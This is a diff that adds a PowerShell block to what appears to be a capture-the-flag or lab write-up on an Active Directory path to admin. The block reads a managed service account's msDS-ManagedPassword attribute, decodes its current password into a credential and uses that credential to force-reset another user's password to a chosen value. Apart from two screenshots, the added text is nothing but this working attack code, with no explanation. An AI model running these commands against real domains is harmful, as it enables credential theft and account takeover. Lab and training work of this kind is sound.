@@ -139,6 +139,21 @@ shortest to admin
 
 
 
+```
+$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+ConvertFrom-ADManagedPasswordBlob $mp
+
+(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
+$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
+$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+
+
+$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass
+Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText '0xdf0xdf!!!' -force)} -Credential $cred
+```
+
+
 ![image](https://user-images.githubusercontent.com/33616880/230703076-28fdc717-d1b7-4ea9-94bd-1c35d378850e.png)
 ![image](https://user-images.githubusercontent.com/33616880/230703110-45490071-b360-4172-91bf-735b46483878.png)
 
